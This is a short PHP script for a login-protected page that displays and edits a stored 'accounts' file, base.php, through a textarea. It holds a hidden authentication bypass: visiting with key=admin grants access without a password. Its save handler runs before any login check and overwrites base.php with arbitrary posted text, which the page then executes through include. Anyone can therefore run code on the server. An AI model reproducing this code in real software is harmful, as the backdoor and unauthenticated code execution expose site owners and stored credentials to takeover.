 <? 
 session_start();
 $login='Your Login';
 $pass='Your password';
 if(!empty($_POST['user']) && !empty($_POST['pass'])){
 if ($_POST['user']==$login && $_POST['pass']==$pass){

$_SESSION['User']=md5($login.'_'.$pass);
} 

}
elseif ($_GET['key']=='admin') { 
$_SESSION['User']=md5($login.'_'.$pass);
 }
 
 If (isset($_POST['submit'])){ 
                $file = "base.php"; 
				unlink($file); 
                $d = $_POST['text']; 
				file_put_contents($file,$d);
              /* $ot = fopen($file, "a"); 
                fwrite($ot, $d); 
                fclose($ot); */ 
				}
				if ($_SESSION['User']==md5($login.'_'.$pass)) {
            ?>   
			  <form method="POST" align=center>  
			   <h1> Your accounts:</h1>
 <textarea class="form_textarea" rows="10" cols="50" name="text"><?include 'base.php';?></textarea>
 <h4 align=center> <input type="submit" name="submit" value="Exit" > </h4> 
 </form> 
 
 <?} else {?>
 
  <form method="post" name="loginform" id="loginform">  
    <fieldset><center>   
        <label for="user">&nbsp&nbsp&nbsp&nbsp&nbspLogin:</label><input type="text" name="user" id="user"><br><center> 
        <label for="pass">Password:</label><input type="password" name="pass" id="pass"><br><center>  
        <input type="submit" name="login" id="login" value="Look!">  
    </fieldset>  
    </form>  
	<?
	}
	?>
